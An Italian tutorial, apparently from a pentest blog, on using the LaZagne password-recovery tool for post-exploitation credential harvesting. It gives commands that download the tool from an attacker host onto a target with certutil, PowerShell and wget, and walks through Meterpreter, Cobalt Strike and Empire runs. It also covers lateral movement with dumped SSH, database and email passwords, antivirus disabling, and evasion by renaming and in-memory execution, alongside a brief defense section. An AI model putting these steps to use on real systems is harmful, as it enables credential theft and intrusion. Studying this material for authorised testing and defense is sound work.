---
title: 'LaZagne: Estrazione Password da Browser e Applicazioni'
slug: lazagne
description: >-
  LaZagne è un tool open-source per recuperare password salvate su Windows e
  Linux da browser, client email e software locali in post-exploitation.
image: /Gemini_Generated_Image_fbk2s6fbk2s6fbk2.webp
draft: false
date: 2026-02-16T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - credential dumping
---

LaZagne è un tool open source Python che recupera **password salvate** da centinaia di applicazioni su Windows, Linux e macOS. A differenza di tool specifici per singole applicazioni, LaZagne supporta browser (Chrome, Firefox, Edge), client email (Outlook, Thunderbird), database ([MySQL](https://hackita.it/articoli/porta-3306-mysql/), [PostgreSQL](https://hackita.it/articoli/porta-5432-postgresql/)), WiFi, SSH, FTP clients, e molti altri.

Il problema nel post-exploitation è che le credenziali sono ovunque: browser salvano password, client FTP memorizzano server credentials, applicazioni custom usano config files con password in chiaro. Cercare manualmente richiede ore e conoscenza specifica di ogni applicazione. LaZagne automatizza questo processo: esegui una volta, ottieni tutte le password recuperabili.

LaZagne è particolarmente potente per **lateral movement**: dopo aver compromesso una workstation, raccogli password per accedere a database interni, server SSH, condivisioni di rete, e altri sistemi. Spesso trovi credenziali per account privilegiati che utenti hanno salvato "per comodità".

Il tool è scritto in Python ma ha build standalone (.exe per Windows) che non richiedono Python installato sul target. Supporta output in JSON, facilmente parsabile per automation. È mantenuto attivamente con update frequenti per supportare nuove applicazioni.

In questo articolo imparerai come usare LaZagne su diverse piattaforme, interpretare l'output, integrazione con framework post-exploitation ([Metasploit](https://hackita.it/articoli/metasploit/), [Cobalt Strike](https://hackita.it/articoli/cobalt-strike/)), e come difendersi dal credential harvesting. Vedrai esempi pratici di lateral movement usando credenziali recuperate, e techniques per maximize recovery success.

***

## 1️⃣ Setup e Installazione

### Windows (standalone binary)

```bash
# Download ultima release
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe

# Nessuna installazione richiesta
LaZagne.exe all
```

**Nota:** Windows Defender potrebbe flaggare come malware (false positive comune per hacking tools).

***

### Linux/macOS (Python)

```bash
# Clone repository
git clone https://github.com/AlessandroZ/LaZagne.git
cd LaZagne

# Linux
cd Linux
python laZagne.py all

# macOS  
cd Mac
python laZagne.py all
```

**Requirements:** Python 2.7 o 3.x

***

### Trasferimento su target

**Windows target:**

```bash
# PowerShell download
powershell -c "IWR -Uri http://10.10.14.5/LaZagne.exe -OutFile C:\Temp\lz.exe"

# certutil (bypass AMSI)
certutil -urlcache -f http://10.10.14.5/LaZagne.exe lz.exe
```

**Linux target:**

```bash
wget http://10.10.14.5/laZagne.py
python laZagne.py all
```

***

## 2️⃣ Uso Base

### Recupero completo (all)

```bash
# Windows
LaZagne.exe all

# Linux
python laZagne.py all
```

**Output esempio (Windows):**

```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

[+] 12 passwords have been found.

########## User: john ##########

------------------- Chrome passwords -----------------
[+] URL: https://mail.google.com
    Username: john@company.com
    Password: MyGmail2024!

[+] URL: https://portal.company.com
    Username: john
    Password: CompanyPortal123

------------------- FileZilla passwords ---------------
[+] Host: ftp.internal.company.com
    Username: ftpadmin
    Password: Ftp@dmin2024!
    Port: 21

------------------- Windows Vault --------------------
[+] Target: Domain:target=server01.company.local
    Username: john
    Password: DomainP@ss123

------------------- WiFi passwords -------------------
[+] SSID: CompanyWiFi
    Password: WiFiSecure2024!
```

🎓 **Output structure:** Organizzato per categoria (browser, FTP, mail, etc.), poi per entry. Username + Password + contesto (URL, host, etc.).

***

### Categorie specifiche

```bash
# Solo browser
LaZagne.exe browsers

# Solo WiFi
LaZagne.exe wifi

# Solo database clients
LaZagne.exe databases

# Lista categorie disponibili
LaZagne.exe -h
```

**Categorie Windows:**

* `browsers` (Chrome, Firefox, Edge, IE, Opera)
* `chats` (Skype, Pidgin)
* `databases` (SQLite, PostgreSQL, MySQL clients)
* `games` (Steam, Minecraft)
* `git` (Git Credential Manager)
* `mails` (Outlook, Thunderbird)
* `wifi`
* `sysadmin` (PuTTY, WinSCP, FileZilla, RDP)

***

### Output JSON (parsing automation)

```bash
LaZagne.exe all -oJ

# Genera LaZagne_output.json
```

**Parse con jq:**

```bash
cat LaZagne_output.json | jq '.[] | select(.Category == "browsers") | .Passwords'
```

Per automation in pentest, consulta [automation di post-exploitation con Python e JSON parsing](https://hackita.it/articoli/pentest-automation-python/).

***

## 3️⃣ Scenari Pratici

### Scenario A: Windows workstation → Internal server access

**Contesto:** Hai compromesso laptop employee via phishing.

```bash
# Esegui LaZagne
C:\Temp> LaZagne.exe all -oJ
```

**Output interessante:**

```json
{
  "Category": "sysadmin",
  "Application": "PuTTY",
  "Passwords": [
    {
      "Host": "db-prod.internal.local",
      "Username": "dbadmin",
      "Password": "Prod_DB_2024!"
    }
  ]
}
```

**Exploitation:**

```bash
# Usa credenziali trovate
ssh dbadmin@db-prod.internal.local
# Password: Prod_DB_2024!
# dbadmin@db-prod:~$

# Accesso a database production!
mysql -u root -p'Prod_DB_2024!'
```

**Timeline:** 5 minuti da workstation compromise a database access

***

### Scenario B: Firefox password dump → Email compromise

**Contesto:** User ha salvato password Gmail in Firefox.

```bash
LaZagne.exe browsers
```

**Output:**

```
------------------- Firefox passwords -----------------
[+] URL: https://mail.google.com
    Username: admin@company.com
    Password: Adm!nEmail2024
```

**Exploitation:**

```bash
# Accesso Gmail
# [login con credenziali trovate]

# Email admin spesso contiene:
# - Reset password link per altri servizi
# - VPN credentials
# - Documenti confidenziali
# - Contatti per social engineering

# Search "password" in inbox
# Trova email con password temporanee, OTP backup codes, etc
```

***

### Scenario C: WiFi password → Network pivot

**Contesto:** Laptop aziendale compromesso, vuoi credenziali WiFi per physical security assessment.

```bash
LaZagne.exe wifi
```

**Output:**

```
------------------- WiFi passwords -------------------
[+] SSID: CorpWiFi-Internal
    Password: C0rpW!F!_S3cur3
    Authentication: WPA2-PSK
```

**Use case:**

* Physical pentest: Accedi WiFi interno durante on-site visit
* Rogue AP: Crea AP con stesso SSID per MITM attack
* Credential reuse testing: Testa password su altri servizi

***

## 4️⃣ Integrazione Toolchain

### LaZagne + Metasploit

**Post-exploitation module:**

```bash
# In Meterpreter session
meterpreter > upload /path/to/LaZagne.exe C:\\Temp\\lz.exe
meterpreter > execute -f C:\\Temp\\lz.exe -a "all -oJ" -H

# Download output
meterpreter > download C:\\Temp\\LaZagne_output.json
```

***

### LaZagne + Cobalt Strike

**Aggressor script:**

```javascript
beacon> upload /tools/LaZagne.exe
beacon> execute-assembly LaZagne.exe all
beacon> download LaZagne_output.json
```

***

### LaZagne + Empire

```bash
(Empire) > usemodule collection/lazagne
(Empire) > set Agent [agent-id]
(Empire) > execute
```

***

## 5️⃣ Maximizing Recovery Success

### Windows: Esegui come utente corretto

LaZagne recupera password dell'**utente corrente**. Se hai SYSTEM, password user non sono accessibili.

**Fix:**

```bash
# Se sei SYSTEM, impersona user
runas /user:john cmd.exe
# In new cmd (come john):
LaZagne.exe all
```

***

### Encrypted browser profiles (Master Password)

Firefox/Chrome permettono master password. LaZagne non può decryptare senza master password.

**Detection:**

```
------------------- Firefox passwords -----------------
[!] Master password is used. Cannot decrypt.
```

**Workaround:** Bruteforce master password (raramente fattibile) o keylogging.

***

### Linux: Permessi file

```bash
# LaZagne Linux richiede read access a:
# ~/.mozilla/firefox/
# ~/.config/google-chrome/
# ~/.ssh/

# Se permessi negati, output vuoto
# Verifica:
ls -la ~/.mozilla/firefox/
```

***

## 6️⃣ Detection & Defense

### Cosa detecta Blue Team

**Behavioral indicators:**

```
- Processo legge multiple password stores in breve tempo
- Access a Chrome "Login Data" database
- Read Firefox logins.json
- Query Windows Vault API
- Access DPAPI blobs
```

**EDR detection:**

```bash
# Process: LaZagne.exe
# Actions:
#   - Read: C:\Users\john\AppData\Local\Google\Chrome\User Data\Default\Login Data
#   - Read: C:\Users\john\AppData\Roaming\FileZilla\recentservers.xml
#   - API: CryptUnprotectData (DPAPI)
```

***

### Evasion techniques

```bash
# 1. Rename binary
ren LaZagne.exe svchost.exe

# 2. In-memory execution (Python version)
python -c "exec(open('laZagne.py').read())"

# 3. Obfuscation
# Modifica source code, ricompila con PyInstaller
```

Se vuoi approfondire evasion techniques per post-exploitation tools, leggi [bypassing EDR in post-exploitation phase](https://hackita.it/articoli/edr-bypass-post-exploitation/).

***

### Defense: Hardening password storage

**Per amministratori:**

1. **Disable password saving in browsers:**

```bash
# Chrome policy
HKLM\Software\Policies\Google\Chrome\PasswordManagerEnabled = 0
```

1. **Credential Guard (Windows 10+):**

```bash
# Protegge Windows Vault con virtualization-based security
bcdedit /set {current} hypervisorlaunchtype auto
```

1. **Master passwords:**

```
Enforce master password usage in Firefox/Thunderbird
```

***

## 7️⃣ Troubleshooting

### LaZagne non trova password esistenti

**Causa 1:** Browser usa sync/cloud storage invece di local storage.

**Fix:** Nessuno. Cloud passwords non sono localmente accessible.

**Causa 2:** Antivirus quarantena LaZagne prima execution.

**Fix:**

```bash
# Disable AV temporaneamente (con autorizzazione!)
Set-MpPreference -DisableRealtimeMonitoring $true

# Esegui LaZagne
LaZagne.exe all

# Re-enable AV
Set-MpPreference -DisableRealtimeMonitoring $false
```

***

### "Access Denied" errors

**Causa:** Insufficient privileges.

**Fix:**

```bash
# Esegui come amministratore
# Right-click → Run as Administrator

# O da Meterpreter:
meterpreter > getsystem
meterpreter > execute -f LaZagne.exe -a all
```

***

## 8️⃣ Comparazione Tool

| **Tool**            | **Platform** | **Browser** | **WiFi** | **SSH** | **Database** | **Output** |
| ------------------- | ------------ | ----------- | -------- | ------- | ------------ | ---------- |
| **LaZagne**         | Win/Lin/Mac  | ✅           | ✅        | ✅       | ✅            | JSON, txt  |
| **Mimikatz**        | Windows      | ❌           | ✅        | ❌       | ❌            | txt        |
| **Mimipenguin**     | Linux        | ❌           | ❌        | ❌       | ❌            | txt        |
| **BrowserPassView** | Windows      | ✅           | ❌        | ❌       | ❌            | CSV, txt   |

**LaZagne vince per versatility.** Copre più categorie di qualsiasi altro tool.

***

## 9️⃣ FAQ

**Q: LaZagne funziona senza admin/root?**

A: **Sì**, recupera password dell'utente corrente. Admin/root dà accesso a password di TUTTI gli utenti.

**Q: LaZagne exfiltrata password via network?**

A: **No**. Tool completamente offline. Output solo locale.

**Q: È safe testare LaZagne sul mio PC?**

A: **Sì**. Non modifica nulla, solo legge. Ma ricorda: recupera TUE password reali. Non condividere output!

**Q: LaZagne bypassa master password browser?**

A: **No**. Se browser usa master password, LaZagne non può decrypt senza quella password.

**Q: Quanto è detection rate di AV?**

A: **Alto (\~40% AV su VirusTotal)**. È hacking tool noto. Usa obfuscation o in-memory execution per evasion.

***

## 10️⃣ Cheat Sheet

| **Task**          | **Command**             |
| ----------------- | ----------------------- |
| **All passwords** | `LaZagne.exe all`       |
| **Only browsers** | `LaZagne.exe browsers`  |
| **Only WiFi**     | `LaZagne.exe wifi`      |
| **JSON output**   | `LaZagne.exe all -oJ`   |
| **Verbose**       | `LaZagne.exe all -v`    |
| **Linux**         | `python laZagne.py all` |
| **macOS**         | `python laZagne.py all` |

***

## Disclaimer

LaZagne è tool per **security research e penetration testing autorizzato**. Recuperare password senza autorizzazione è illegale (Computer Fraud and Abuse Act, GDPR violations). Usa solo in:

* Lab personali
* Pentest con contratto firmato
* Con consenso esplicito del proprietario sistema

**Repository:** [https://github.com/AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
